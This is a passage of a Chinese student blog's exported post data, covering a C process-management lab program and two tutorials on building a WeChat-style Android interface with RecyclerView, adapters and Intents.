class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">const</span> <span class="type">int</span> max = <span class="number">5</span>;  <span class="comment">// 最大进程数</span></span><br><span class="line">    Process p[max];  <span class="comment">// 进程数组</span></span><br><span class="line">    <span class="type">int</span> num = <span class="number">0</span>;  <span class="comment">// 当前进程数</span></span><br><span class="line"></span><br><span class="line">    <span class="type">int</span> choice;</span><br><span class="line">    <span class="keyword">do</span> &#123;</span><br><span class="line">        <span class="comment">// 显示菜单</span></span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;\nProcess Management Menu:\n&quot;</span>);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;1. Create Process\n&quot;</span>);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;2. View Running p\n&quot;</span>);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;3. Switch Process\n&quot;</span>);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;4. End Process\n&quot;</span>);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;5. Wake up Process\n&quot;</span>);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;0. Exit\n&quot;</span>);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;Enter your choice: &quot;</span>);</span><br><span class="line">        <span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>, &amp;choice);</span><br><span class="line">        <span class="comment">//判断输入选项</span></span><br><span class="line">        <span class="keyword">switch</span> (choice)&#123;</span><br><span class="line">            <span class="keyword">case</span> <span class="number">1</span>:</span><br><span class="line">                   <span class="keyword">if</span>(num&lt;max)&#123;<span class="comment">//如果大于最大进程则不再创建</span></span><br><span class="line">                    createp(&amp;p[num]);</span><br><span class="line">                    num++;</span><br><span class="line">                   &#125;</span><br><span class="line">                   <span class="keyword">else</span> <span class="built_in">printf</span>(<span class="string">&quot;process reachs max num&quot;</span>);</span><br><span class="line">                   <span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">case</span> <span class="number">2</span>:</span><br><span class="line">            viewp(p,num);</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">case</span> <span class="number">3</span>:<span class="comment">//调换进程</span></span><br><span class="line">                <span class="keyword">if</span>(num&gt;<span class="number">0</span>)&#123;</span><br><span class="line">                    <span class="type">int</span> index;</span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">&quot;enter index you want to switch：&quot;</span>);</span><br><span class="line">                <span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>,&amp;index);</span><br><span class="line">                switchp(p,num,index<span class="number">-1</span>);</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">else</span> <span class="built_in">printf</span>(<span class="string">&quot;the process is empty&quot;</span>);</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">case</span> <span class="number">4</span>:<span class="comment">//end进程</span></span><br><span class="line">                <span class="keyword">if</span>(num&gt;<span class="number">0</span>)&#123;</span><br><span class="line">                    <span class="type">int</span> index;</span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">&quot;enter index you want to end：&quot;</span>);</span><br><span class="line">                <span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>,&amp;index);</span><br><span class="line">                endp(p,num,index<span class="number">-1</span>);</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">else</span> <span class="built_in">printf</span>(<span class="string">&quot;the process is empty&quot;</span>);</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">case</span> <span class="number">5</span>:<span class="comment">//唤醒进程</span></span><br><span class="line">                <span class="keyword">if</span>(num&lt;max)&#123;</span><br><span class="line">                    <span class="type">int</span> index;</span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">&quot;enter index you want to wake：&quot;</span>);</span><br><span class="line">                <span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>,&amp;index);</span><br><span class="line">                wakep(p,num,index<span class="number">-1</span>);</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">else</span> <span class="built_in">printf</span>(<span class="string">&quot;the process is full&quot;</span>);</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">case</span> <span class="number">0</span>:<span class="comment">//退出程序</span></span><br><span class="line">                 <span class="built_in">printf</span>(<span class="string">&quot;exit the process&quot;</span>);</span><br><span class="line">                 <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>;i&lt;num;i++)</span><br><span class="line">                    endp(p,num,i);</span><br><span class="line">                <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">            <span class="keyword">default</span>:<span class="comment">//重新选择</span></span><br><span class="line">                 <span class="built_in">printf</span>(<span class="string">&quot;what you enter is error,please put again&quot;</span>);</span><br><span class="line">        &#125; &#125;</span><br><span class="line"><span class="keyword">while</span>(<span class="number">1</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">        </span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>程序功能测试：</p><p>1：创建进程</p><p> <img src="https://s2.loli.net/2023/11/12/nmCtRFGVUBHWA8h.png" alt="image-20231111234900636"></p><p>图表 8程序功能测试</p><p>2：显示进程</p><p> <img src="https://s2.loli.net/2023/11/12/dOPVD571nQbJHrC.png" alt="image-20231111234904463"></p><p>3：调换进程</p><p> <img src="https://s2.loli.net/2023/11/12/apeImbYHB4tldWM.png" alt="image-20231111234909922"></p><p>4：结束进程</p><p>  <img src="https://s2.loli.net/2023/11/12/MbFerfpYUglnwz7.png" alt="image-20231111234924453"></p><p>5：唤醒进程</p><p> <img src="https://s2.loli.net/2023/11/12/ATDROPelr5nwaiE.png" alt="image-20231111234932351"></p><p>6：结束程序</p><p><img src="https://s2.loli.net/2023/11/12/uUKxaCsHDjzgA9L.png" alt="image-20231111234955881"></p><h2 id="4-实验总结"><a href="#4-实验总结" class="headerlink" title="4 实验总结"></a><strong>4</strong> <strong>实验总结</strong></h2><p><strong>Q1****：在进行子进程执行查看当前进程时，”hello,I am child”语句不显示</strong></p><p>上网查找后发现执行execlp函数后会把命令的程序覆盖子进程代码，所以将“hello，I am child“语句放在execlp函数之前即可显示</p><p><strong>Q1****：编写第三题程序时出现好几处错误</strong></p><p> <img src="https://s2.loli.net/2023/11/12/7MglUF5ncHa9vpA.png" alt="image-20231111235005810"></p><p><img src="https://s2.loli.net/2023/11/12/7bingrC8lowPtdF.png" alt="image-20231111235010179"></p><p>后经过调试解决</p><p>通过此次实验，将操作系统的进程和大一所学的C语言大作业结合了起来，知识之间有了关联，印象更加深刻</p><p>通过几个任务进一步了解了进程的知识</p>]]></content>
      
      
      <categories>
          
          <category> 操作系统 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 学习 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Android开发-类微信界面设计（二）</title>
      <link href="/2023/10/27/Android%E5%BC%80%E5%8F%91-%E7%B1%BB%E5%BE%AE%E4%BF%A1%E7%95%8C%E9%9D%A2%E8%AE%BE%E8%AE%A1%EF%BC%88%E4%BA%8C%EF%BC%89/"/>
      <url>/2023/10/27/Android%E5%BC%80%E5%8F%91-%E7%B1%BB%E5%BE%AE%E4%BF%A1%E7%95%8C%E9%9D%A2%E8%AE%BE%E8%AE%A1%EF%BC%88%E4%BA%8C%EF%BC%89/</url>
      
        <content type="html"><![CDATA[<h1 id="Android开发-类微信界面设计（二）"><a href="#Android开发-类微信界面设计（二）" class="headerlink" title="Android开发-类微信界面设计（二）"></a>Android开发-类微信界面设计（二）</h1><h2 id="一、实现效果图"><a href="#一、实现效果图" class="headerlink" title="一、实现效果图"></a>一、实现效果图</h2><p><img src="https://s2.loli.net/2023/11/11/y9lVvK7hra35dwo.png"></p><p><img src="https://s2.loli.net/2023/11/11/1OLqTjzSQmyMfZ8.gif"></p><h2 id="二、功能说明："><a href="#二、功能说明：" class="headerlink" title="二、功能说明："></a>二、功能说明：</h2><p>在上次实验的基础之上把recycleviewb列表完善并且<font color="red">增加点击效果</font>，点击之后可以<font color="red">跳转到另外一个activity上</font>，并且添加返回按钮，可以放回原列表页面，<font color="red">列表中的每一行都对应的不同的数据</font></p><p>故需要实现的功能</p><p>1：activity之间的跳转</p><p>2：数据的绑定</p><h2 id="三、功能实现"><a href="#三、功能实现" class="headerlink" title="三、功能实现"></a>三、功能实现</h2><h3 id="1：列表创建"><a href="#1：列表创建" class="headerlink" title="1：列表创建"></a>1：列表创建</h3><p>涉及到如下xml文件：</p><p><img src="https://s2.loli.net/2023/11/11/Tqp5t1mIEeaVKXc.png"></p><p>需要用到recycleview控件创建列表</p><blockquote><p>recycleview</p></blockquote><p>RecyclerView是Android中用于展示大量数据列表的高级视图组件。它是对ListView的改进和扩展，提供了更灵活、高效的方式来展示和管理大型数据集。</p><p><img src="https://s2.loli.net/2023/11/11/xWJgZ7waBDYiGfO.png"></p><p>recycleview是一个列表，接下来创建行item</p><h4 id="设计item-xml"><a href="#设计item-xml" class="headerlink" title="设计item.xml"></a>设计item.xml</h4><p><img src="https://s2.loli.net/2023/11/11/eZF4Bg9vLNS12R3.png"></p><p>头像+姓名 故添加2个控件</p><p>功能为点击行之后跳转出个人的详情页面 </p><h4 id="details-people-xml设计"><a href="#details-people-xml设计" class="headerlink" title="details_people.xml设计"></a>details_people.xml设计</h4><p>四个控件显示</p><p>1：姓名</p><p>2：电话</p><p>3：地址</p><p>4：朋友圈</p><p>加一个button返回值列表</p><p><img src="https://s2.loli.net/2023/11/11/Sn79qLWkAJVOug4.png"></p><p>显示xml文件设计全部完成，接下来需要连接数据即后端</p><h3 id="2：连接数据"><a href="#2：连接数据" class="headerlink" title="2：连接数据"></a>2：连接数据</h3><h4 id="存储数据"><a href="#存储数据" class="headerlink" title="存储数据"></a>存储数据</h4><p>往列表里面传入数据，先要创建数据源，在fragment1.java里创建list列表进行数据存储</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">List&lt;Map&lt;String,Object&gt;&gt; items=new ArrayList&lt;Map&lt;String,Object&gt;&gt;();</span><br></pre></td></tr></table></figure><p>创建一个列表，列表的内容为键值对 键的内容为string ，值的内容为任意类型</p><p>每一个map对象都是一个联系人，里面存储着ta的信息</p><p>&#x3D;&#x3D;通过for循环存入数据&#x3D;&#x3D;</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">for(int i=0;i&lt;names.length;i++)&#123;</span><br><span class="line">           Map&lt;String,Object&gt; item=new HashMap&lt;String, Object&gt;();</span><br><span class="line">           item.put(&quot;i_name&quot;,names[i]);</span><br><span class="line">           item.put(&quot;i_image&quot;,images[i]);</span><br><span class="line">           item.put(&quot;i_phone&quot;,phones[i]);</span><br><span class="line">           item.put(&quot;i_region&quot;,regions[i]);</span><br><span class="line">           item.put(&quot;i_tag&quot;,tags[i]);</span><br><span class="line">           items.add(item);</span><br><span class="line">       &#125;</span><br></pre></td></tr></table></figure><p>数据传入之后进行连接，把数据导入进列表</p><p>需要用到adapter</p><h4 id="绑定数据"><a href="#绑定数据" class="headerlink" title="绑定数据"></a>绑定数据</h4><blockquote><p>Adapter</p></blockquote><p>是数据源和视图之间的桥梁，把数据绑定到item里</p><p>里面有一个叫<font color="red">Holder的类</font>，和一个<font color="red">onBindViewHolder</font>的方法</p><blockquote><p>Holder</p></blockquote><p>在Adapter中，holder用于绑定视图</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">public class Myholder extends RecyclerView.ViewHolder&#123;</span><br><span class="line"></span><br><span class="line">       public ImageView imageView;</span><br><span class="line">       TextView textView;</span><br><span class="line"></span><br><span class="line">       public Myholder(@NonNull View itemView) &#123;</span><br><span class="line">           super(itemView);</span><br><span class="line">           textView=itemView.findViewById(R.id.name);//引用item.xml里id为textView1的textView作为Myholder这个类中</span><br><span class="line">           imageView = (ImageView) itemView.findViewById(R.id.image);</span><br><span class="line">           //textView对象的初始值</span><br><span class="line">       &#125;</span><br><span class="line">   &#125;</span><br></pre></td></tr></table></figure><p>如上：这个holder类绑定了item.xml的控件image和textview（他们的id分别是image和name）</p><p><img src="https://s2.loli.net/2023/11/11/mAD5G4wZWSBd9iz.png" alt="image-20231111153328419"></p><blockquote><p>onBindViewHolder</p></blockquote><p>这个方法是把数据集中的数据绑定到控件中</p><ul><li>1：数据绑定</li></ul><p>name通过list位置position的不同自动获取不同的数据（position会自动变化）</p><p><img src="https://s2.loli.net/2023/11/11/G8M3bcE4Q1gjhfO.png" alt="image-20231111153911926"></p><ul><li>2：设置跳转事件</li></ul><p>当点击textview控件也就是我们的name时，这个onclick函数就会响应</p><p>这里有一个intent类</p><blockquote><p>Intent</p></blockquote><p>Intent用于组件之间的通信和交互可以启动其他的activity，service，broadcastRecever等组件</p><p>可以</p><ol><li>启动组件：通过创建一个Intent对象并指定要启动的组件的类名或动作，可以启动其他应用程序中的Activity、Service或BroadcastReceiver组件。例如，你可以使用Intent启动一个新的Activity来显示一个新的界面。</li><li>传递数据：Intent可以携带数据，以便在组件之间进行传递。你可以使用<code>putExtra()</code>方法将额外的数据附加到Intent中，然后在目标组件中使用<code>getXXXExtra()</code>方法获取这些数据。数据可以是基本类型（如字符串、整数等），也可以是复杂的对象。</li><li>发送广播：通过创建一个Intent并指定广播的动作，你可以发送广播消息，使得其他应用程序中的BroadcastReceiver组件可以接收并处理该广播。广播可以用于应用程序内部的通信，也可以用于应用程序间的通信。</li><li>打开系统功能：Intent可以用于打开系统功能，如拨打电话、发送短信、打开浏览器等。系统会根据Intent的内容选择合适的应用程序来处理请求。</li></ol><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">holder.textView.setOnClickListener(new View.OnClickListener() &#123;</span><br><span class="line">          @Override</span><br><span class="line">          public void onClick(View v) &#123;</span><br><span class="line">              //点击后跳转到联系人详情页</span><br><span class="line">              Intent intent=new Intent(context1,Activitypeople.class);</span><br><span class="line">              //向intent传值</span><br><span class="line">              intent.putExtra(&quot;details&quot;,name);</span><br><span class="line">              intent.putExtra(&quot;image&quot;,image);</span><br><span class="line">              intent.putExtra(&quot;phone&quot;,phone);</span><br><span class="line">              intent.putExtra(&quot;region&quot;,region);</span><br><span class="line">              intent.putExtra(&quot;tag&quot;,tag);</span><br><span class="line">              intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);</span><br><span class="line">              //开始跳转</span><br><span class="line">              context1.startActivity(intent);</span><br><span class="line">          &#125;</span><br><span class="line">      &#125;);</span><br></pre></td></tr></table></figure><p>这段代码就用了intent的2个功能</p><p>1：启动组件，当点击name时，从本组件跳到了activitypeople这个组件</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Intent intent=new Intent(context1,Activitypeople.class);</span><br></pre></td></tr></table></figure><p>2：数据传送，把detail，image，phone等数据放到了intent这个对象里面</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">intent.putExtra(&quot;details&quot;,name);</span><br><span class="line">                intent.putExtra(&quot;image&quot;,image);</span><br><span class="line">                intent.putExtra(&quot;phone&quot;,phone);</span><br><span class="line">                intent.putExtra(&quot;region&quot;,region);</span><br><span class="line">                intent.putExtra(&quot;tag&quot;,tag);</span><br></pre></td></tr></table></figure><p>最后从Madapter.java跳转至ActivityPeople.java</p><p>这是一个activity 连接着details_people.xml</p><p>也就是一个item对应的一个people的详情页面</p><p>details_people.xml的效果图如下：</p><p><img src="https://s2.loli.net/2023/11/11/OKGtkQsISo2glb7.png"></p><p>故ActivityPeople.java中要对这个效果进行数据的绑定展示，相当数据库后端</p><ul><li>与xml文件绑定</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">super.onCreate(savedInstanceState);</span><br><span class="line">setContentView(R.layout.details_people);</span><br></pre></td></tr></table></figure><ul><li>创建xml效果有的控件：</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">TextView dName,textView1,textView2;</span><br><span class="line"> ImageView dImage,aImage,cImage,pImage;</span><br><span class="line"> Button button_r;</span><br><span class="line"> View view;</span><br></pre></td></tr></table></figure><ul><li>绑定控件</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">dName=findViewById(R.id.dname);</span><br><span class="line">dImage=findViewById(R.id.imagename);</span><br><span class="line">aImage=findViewById(R.id.imageadd);</span><br><span class="line">cImage=findViewById(R.id.imagecircle);</span><br><span class="line">pImage=findViewById(R.id.imagephone);</span><br><span class="line">textView1=findViewById(R.id.dphone);</span><br><span class="line">textView2=findViewById(R.id.dadd);</span><br></pre></td></tr></table></figure><ul><li>获取从上一个activity传递过来的带有数据的intent类</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">//获取上一个Actvity传过来的intent</span><br><span class="line">Intent intent=getIntent();</span><br></pre></td></tr></table></figure><ul><li>设置控件获取数据</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">dImage.setImageResource(intent.getIntExtra(&quot;image&quot;,R.drawable.baba));</span><br><span class="line">dName.setText(intent.getStringExtra(&quot;details&quot;));</span><br><span class="line">aImage.setImageResource(R.drawable.weizhi);</span><br><span class="line">cImage.setImageResource(R.drawable.circle);</span><br><span class="line">pImage.setImageResource(R.drawable.dianhua);</span><br><span class="line">textView1.setText(intent.getStringExtra(&quot;phone&quot;));</span><br><span class="line">textView2.setText(intent.getStringExtra(&quot;region&quot;));</span><br></pre></td></tr></table></figure><ul><li>button实现返回到原来的activity效果</li></ul><p>跳转到原来的Fragment1页面</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">button_r.setOnClickListener(new View.OnClickListener() &#123;</span><br><span class="line">            @Override</span><br><span class="line">            public void onClick(View view) &#123;</span><br><span class="line">                Intent intent1=new Intent(Activitypeople.this, MainActivity.class);</span><br><span class="line">                startActivity(intent1);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;);</span><br></pre></td></tr></table></figure><blockquote><p><font color="red">startActivity</font></p></blockquote><p>通过调用<code>startActivity()</code>方法，你可以向系统发出请求，以启动另一个Activity并在屏幕上显示相应的界面。</p><p>这种启动是<font color="red">没有返回值的</font></p><p>如果要有放回值的启动需要用到launch的启动</p><h2 id="summary"><a href="#summary" class="headerlink" title="summary"></a>summary</h2><p>问题：</p><h3 id="q1：详情页面效果时，地址、朋友圈等图像无法显示"><a href="#q1：详情页面效果时，地址、朋友圈等图像无法显示" class="headerlink" title="q1：详情页面效果时，地址、朋友圈等图像无法显示"></a>q1：详情页面效果时，地址、朋友圈等图像无法显示</h3><p><img src="https://s2.loli.net/2023/11/11/2F6qrMnysuROEBl.png"></p><p>因为这些image都是固定的，而不是根据position变化而变化的，上网查找发现在<code>onBindViewHolder()</code>方法中，为ImageView设置固定图像资源时，不使用<code>position</code>参数获取列表项的位置对应的图像资源，而是直接定义获取图像资源如下：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">cImage=findViewById(R.id.imagecircle);</span><br><span class="line">cImage.setImageResource(R.drawable.circle);</span><br></pre></td></tr></table></figure><p>而根据position变化而变的图像、文字连接：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">dName=findViewById(R.id.dname);</span><br><span class="line">dName.setText(intent.getStringExtra(&quot;details&quot;));</span><br></pre></td></tr></table></figure><h3 id="q2：效果显示时地址无法显示"><a href="#q2：效果显示时地址无法显示" class="headerlink" title="q2：效果显示时地址无法显示"></a>q2：效果显示时地址无法显示</h3><p><img src="https://s2.loli.net/2023/11/11/Ah2t1qNiyW4fmFV.png"></p><p>查看代码后发现 绑定数据时region单词拼写错误，导致地址数据无法绑定完成</p><p><img src="https://s2.loli.net/2023/11/11/Y4pCusEtAQyzNmI.png"></p><p><img src="https://s2.loli.net/2023/11/11/Kx5UuG8WhNp3str.png"></p><h3 id="q3：网上无法找到大小一致的图片"><a href="#q3：网上无法找到大小一致的图片" class="headerlink" title="q3：网上无法找到大小一致的图片"></a>q3：网上无法找到大小一致的图片</h3><p>前期使用的是网上随便找的图片，导致设计xml文件时，格式无法控制，效果显示不佳</p><p><img src="https://s2.loli.net/2023/11/11/8xE6rqziuG3nlRI.png"></p><p>后面询问同学得知可以在<a href="https://www.iconfont.cn/collections/index?spm=a313x.home_index.i1.1.58a33a81f2mOyh&page=4">iconfont-阿里巴巴矢量图标库</a>内进行图标选取，这个库里面的图大小基本一致并且数量种类丰富，可以免费使用</p><p>android开发对于我来说是一种全新的体验，遇到的困难很多，同时带来的锻炼也是巨大的，收益匪浅，通过一个个解决困难的过程，感觉到了自己在一步步成长</p><p>源码地址：<a href="https://gitee.com/jardny/My_AndroidWork">https://gitee.com/jardny/My_AndroidWork</a></p>]]></content>
      
      
      <categories>
          
          <category> 安卓开发 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 安卓 </tag>
            
            <tag> 学习 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Android开发-类微信界面设计（一）</title>
      <link href="/2023/10/27/Android%E5%BC%80%E5%8F%91-%E7%B1%BB%E5%BE%AE%E4%BF%A1%E7%95%8C%E9%9D%A2%E8%AE%BE%E8%AE%A1%EF%BC%88%E4%B8%80%EF%BC%89/"/>
      <url>/2023/10/27/Android%E5%BC%80%E5%8F%91-%E7%B1%BB%E5%BE%AE%E4%BF%A1%E7%95%8C%E9%9D%A2%E8%AE%BE%E8%AE%A1%EF%BC%88%E4%B8%80%EF%BC%89/</url>
      
        <content type="html"><![CDATA[<h1 id="Android开发-类微信界面设计（一）"><a href="#Android开发-类微信界面设计（一）" class="headerlink" title="Android开发-类微信界面设计（一）"></a>Android开发-类微信界面设计（一）</h1><h2 id="一、实现效果图如下："><a href="#一、实现效果图如下：" class="headerlink" title="一、实现效果图如下："></a>一、实现效果图如下：</h2><p><img src="https://s2.loli.net/2023/11/10/ef9xXPBC1iQmEgo.png" alt="image-20231014171856284"></p><p><img src="https://gitee.com/jardny/typora_images/raw/master/images/%E5%8A%A8%E7%94%BB.gif" alt="动画"></p><h2 id="二、功能说明："><a href="#二、功能说明：" class="headerlink" title="二、功能说明："></a>二、功能说明：</h2><p>设计一个类微信的主界面UI，有&#x3D;&#x3D;上中下&#x3D;&#x3D;三个结构，包含&#x3D;&#x3D;四个界面&#x3D;&#x3D;：聊天、联系人、位置、设置，并且实现&#x3D;&#x3D;点击下方进行界面跳转&#x3D;&#x3D;，并且在其中一个tab界面&#x3D;&#x3D;显示列表效果&#x3D;&#x3D;</p><h2 id="三、知识点简单介绍"><a href="#三、知识点简单介绍" class="headerlink" title="三、知识点简单介绍"></a>三、知识点简单介绍</h2><p>在Android开发中，<strong>XML文件</strong>和<strong>Java文件</strong>是两种主要的文件类型，用于定义和控制应用程序的布局、界面和功能。</p><blockquote><p> <font color="red">xml文件</font></p></blockquote><p>XML文件用于定义应用程序的布局和界面。简单来说就是你能看到的效果图均是由它构成，相当于前端</p><blockquote><p><font color="red">java文件</font></p></blockquote><p>Java文件是应用程序的逻辑和功能的实现。就是后端</p><h2 id="四、实现说明"><a href="#四、实现说明" class="headerlink" title="四、实现说明"></a>四、实现说明</h2><h3 id="上中下三个结构"><a href="#上中下三个结构" class="headerlink" title="上中下三个结构"></a>上中下三个结构</h3><p><img src="https://s2.loli.net/2023/11/10/awMb7516ecJd8kt.png" alt="image-20231014174546111"></p><p>观察可以很明显发现效果图布局为<font color="red">上中下</font>，那么显示就需要在一个主xml（<code>main.xml</code>）上把三个xml显示出来（分别负责上中下）<code>bottom.xml</code>、<code>top.xml</code>、<code>中间显示的xml</code></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">由于中间有四个界面需要显示 所以再命名为tab1.xml，tab2.xml，tab3.xml，tab4.xml</span><br></pre></td></tr></table></figure><h4 id="main（主界面）"><a href="#main（主界面）" class="headerlink" title="main（主界面）"></a>main（主界面）</h4><p>需要把三个部分的xml文件全部压入main.xml中</p><p><img src="https://s2.loli.net/2023/11/10/zpK4WQimqLChTHo.png" alt="image-20231014184607181"></p><p>用include包含上中下</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=<span class="string">&quot;1.0&quot;</span> encoding=<span class="string">&quot;utf-8&quot;</span>?&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">LinearLayout</span> <span class="attr">xmlns:android</span>=<span class="string">&quot;http://schemas.android.com/apk/res/android&quot;</span></span></span><br><span class="line"><span class="tag">    <span class="attr">xmlns:tools</span>=<span class="string">&quot;http://schemas.android.com/tools&quot;</span></span></span><br><span class="line"><span class="tag">    <span class="attr">xmlns:app</span>=<span class="string">&quot;http://schemas.android.com/apk/res-auto&quot;</span></span></span><br><span class="line"><span class="tag">    <span class="attr">android:layout_width</span>=<span class="string">&quot;match_parent&quot;</span></span></span><br><span class="line"><span class="tag">    <span class="attr">android:layout_height</span>=<span class="string">&quot;match_parent&quot;</span></span></span><br><span class="line"><span class="tag">    <span class="attr">android:orientation</span>=<span class="string">&quot;vertical&quot;</span></span></span><br><span class="line"><span class="tag">    <span class="attr">tools:context</span>=<span class="string">&quot;.MainActivity&quot;</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">include</span> <span class="attr">layout</span>=<span class="string">&quot;@layout/top&quot;</span> &gt;</span><span class="tag">&lt;/<span class="name">include</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">FrameLayout</span></span></span><br><span class="line"><span class="tag">        <span class="attr">android:id</span>=<span class="string">&quot;@+id/content&quot;</span></span></span><br><span class="line"><span class="tag">        <span class="attr">android:layout_width</span>=<span class="string">&quot;match_parent&quot;</span></span></span><br><span class="line"><span class="tag">        <span class="attr">android:layout_height</span>=<span class="string">&quot;0dp&quot;</span></span></span><br><span class="line"><span class="tag">        <span class="attr">android:layout_gravity</span>=<span class="string">&quot;center&quot;</span></span></span><br><span class="line"><span class="tag">        <span class="attr">android:layout_weight</span>=<span class="string">&quot;1&quot;</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;/<span class="name">FrameLayout</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">include</span> <span class="attr">layout</span>=<span class="string">&quot;@layout/bottom&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">include</span>&gt;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;/<span class="name">LinearLayout</span>&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><h4 id="top"><a href="#top" class="headerlink" title="top"></a>top</h4><h5 id="效果"><a href="#效果" class="headerlink" title="&#x3D;&#x3D;效果&#x3D;&#x3D;"></a>&#x3D;&#x3D;效果&#x3D;&#x3D;</h5><p><img src="https://s2.loli.net/2023/11/10/pJCHRozM4KNvEIj.png" alt="image-20231014180046346"></p><p>很明显就一个位置在<font color="red">top</font>的<font 